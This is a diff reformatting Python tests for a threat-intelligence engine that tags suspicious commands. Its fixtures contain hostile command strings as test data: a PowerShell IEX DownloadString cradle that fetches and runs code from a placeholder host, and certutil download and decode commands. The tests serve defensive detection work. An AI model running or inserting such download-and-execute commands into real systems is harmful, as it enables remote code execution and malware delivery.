@@ -3,14 +3,16 @@ from titan_decoder.threat_intel import ThreatIntelligenceEngine
 
 def test_powershell_downloader_maps_attack_lolbin_and_tags():
     report = {
-        "nodes": [{
-            "id": 3,
-            "content_preview": (
-                "powershell.exe -enc AAAA; "
-                "IEX(New-Object Net.WebClient).DownloadString"
-                "('https://example.test/a')"
-            ),
-        }],
+        "nodes": [
+            {
+                "id": 3,
+                "content_preview": (
+                    "powershell.exe -enc AAAA; "
+                    "IEX(New-Object Net.WebClient).DownloadString"
+                    "('https://example.test/a')"
+                ),
+            }
+        ],
         "iocs": {"urls": ["https://example.test/a"]},
     }
     result = ThreatIntelligenceEngine().analyze(report)
@@ -26,7 +28,10 @@ def test_powershell_downloader_maps_attack_lolbin_and_tags():
 def test_threat_intelligence_is_deterministic():
     report = {
         "nodes": [
-            {"id": 1, "content_preview": "certutil -urlcache -f https://x.test/a a.bin"},
+            {
+                "id": 1,
+                "content_preview": "certutil -urlcache -f https://x.test/a a.bin",
+            },
             {"id": 2, "content_preview": "certutil -decode a.txt a.bin"},
         ],
         "iocs": {"urls": ["https://x.test/a"]},
